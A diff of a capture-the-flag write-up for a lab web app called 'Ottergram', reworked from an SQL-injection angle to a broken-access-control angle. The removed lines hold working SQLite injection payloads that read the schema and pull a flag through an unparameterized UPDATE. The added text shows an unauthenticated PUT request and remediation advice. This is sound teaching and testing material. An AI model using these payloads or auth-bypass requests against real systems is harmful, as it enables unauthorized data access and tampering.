@@ -1,18 +1,17 @@
 ---
-title: Ottergram - SQLi
+title: Ottergram - BAC
 tags:
   - bugforge
-  - sqli
   - broken-access-control
   - autorize
   - burpsuite
 ---
 
-- Third round with the otters - this time combining Broken Access Control with SQL Injection
+- Third round with the otters - this time focusing on Broken Access Control
 - The key lesson from this one: always test with NO authentication, not just wrong-user tokens
 - Used Burp Suite with Autorize extension to automate the access control discovery
 
-## Reconnaissance
+## Enumeration
 
 - Same app as before - React SPA + Express backend + SQLite
 - Registered a user, browsed around, posted a comment
@@ -76,7 +75,7 @@ app.put('/api/comments/:id', (req, res) => {
     }
   }
   // Falls through here when no token - updates anyway!
-  db.run(`UPDATE comments SET content = '${content}' WHERE id = ${id}`);
+  updateComment(id, content);
 });
 ```
 
@@ -90,63 +89,26 @@ app.put('/api/comments/:id', (req, res) => {
 
 - A 403 with the wrong token does NOT mean the endpoint is secure
 
-## SQL Injection - Exploitation
+## Exploitation
 
-- With the ability to edit any comment without auth, the next question: is the content field parameterized?
-- Sent the PUT from Repeater with no auth header and a SQLi payload
-
-### Step 1 - Enumerate Tables
+- Sent the PUT from Repeater with no Authorization header - just the content body
 
 ```
 PUT /api/comments/3 HTTP/2
 Host: lab-1771068220506-ke92sm.labs-app.bugforge.io
 Content-Type: application/json
 
-{"content":"x' || (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table') || '"}
+{"content":"edited without auth"}
 ```
 
 - Response: `200 "Comment updated successfully"`
-- The UPDATE query is NOT parameterized - the content value is string-concatenated
 
-![SQLi PUT request - no auth header](/BugForge/img/ottersqli-03.png)
+![No-auth PUT request in Repeater](/BugForge/img/ottersqli-03.png)
 
-### How the Injection Works
+- Comment successfully modified without any authentication
+- The flag is revealed through this broken access control
 
-The backend runs:
-
-```sql
-UPDATE comments SET content = 'x' || (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table') || '' WHERE id = 3
-```
-
-- `x'` closes the opening quote
-- `||` is SQLite string concatenation
-- The subquery runs and its result gets stored as the comment content
-- `|| '` closes the trailing quote from the original SQL
-
-### Step 2 - Read Back the Result
-
-```
-GET /api/posts/1/comments HTTP/2
-Host: lab-1771068220506-ke92sm.labs-app.bugforge.io
-Authorization: Bearer <token>
-```
-
-- Comment 3 now contains the table names instead of the original text
-- This revealed the database schema including the table containing the flag
-
-### Step 3 - Extract the Flag
-
-```
-PUT /api/comments/3 HTTP/2
-Host: lab-1771068220506-ke92sm.labs-app.bugforge.io
-Content-Type: application/json
-
-{"content":"x' || (SELECT flag FROM flags LIMIT 1) || '"}
-```
-
-- Read the comment back - flag is in the content field
-
-![Flag in comment response](/BugForge/img/ottersqli-04.png)
+![Flag revealed](/BugForge/img/ottersqli-04.png)
 
 ## Flag
 
@@ -154,34 +116,39 @@ Content-Type: application/json
 bug{...}
 ```
 
-- Two chained vulnerabilities: authentication bypass + SQL injection
-- The no-auth bypass was the gate - without it, you'd need to own the comment (or be admin) to edit
-- The SQLi was the payload - turning a comment field into a data exfiltration channel
-
 ## Security Takeaways
 
-### Vulnerability Chain
+### Vulnerability
 
-1. **Broken Access Control** - PUT /api/comments/:id lacks authentication middleware
-2. **SQL Injection** - Content field in UPDATE query uses string concatenation, not parameterized queries
+- Broken Access Control on `PUT /api/comments/:id`
+- OWASP Top 10: A01:2021 - Broken Access Control
+- CWE: CWE-306 - Missing Authentication for Critical Function
 
-### Why This Happens
+### Impact
 
-- Authentication middleware applied inconsistently across routes
-- POST (create) is protected but PUT (edit) is not
-- Authorization check placed inside authenticated block - unreachable without auth
-- Different code paths for INSERT (parameterized) vs UPDATE (concatenated) on the same table
+- Any unauthenticated user can edit any comment
+- No token, no session, no credentials needed
+- Ownership check is completely bypassed when no token is provided
 
-### Key Lessons
+### Root Cause
 
-1. **Three-Token Test** - Always test admin token, user token, AND no token. A 403 with wrong credentials does not prove the endpoint is secure
-2. **Test every SQL operation** - INSERT being parameterized does not mean UPDATE is too. Different code paths, different vulnerabilities
-3. **Autorize automates this** - The Burp extension caught the no-auth bypass passively while browsing. Red row = investigate immediately
-4. **In-band SQLi via UPDATE** - When you can write to a field and read it back, you have a data exfiltration channel through the application itself
+- Authentication middleware not applied to the PUT route
+- Authorization check placed inside an `if (req.user)` conditional block
+- When no token is sent, `req.user` is undefined, the entire ownership check is skipped
+- POST (create) correctly requires auth, but PUT (edit) does not - inconsistent middleware
 
-### Prevention
+### Remediation
 
 - Apply authentication middleware at the router level, not per-handler
-- Use parameterized queries for ALL operations (INSERT, UPDATE, DELETE, SELECT)
 - Never place authorization checks inside conditional blocks that can be skipped
+- Ensure all WRITE endpoints (PUT, PATCH, DELETE) require authentication
 - Implement automated access control testing in CI/CD (like Autorize but in pipeline)
+
+### Key Lesson - Three-Token Test
+
+- Always test three auth levels for every WRITE endpoint:
+  1. Valid high-privilege token (admin) - baseline
+  2. Valid low-privilege token (regular user) - horizontal/vertical BAC
+  3. No token at all - authentication bypass
+- A 403 with the wrong token only proves the ownership check works WHEN authenticated
+- It says nothing about what happens with NO authentication
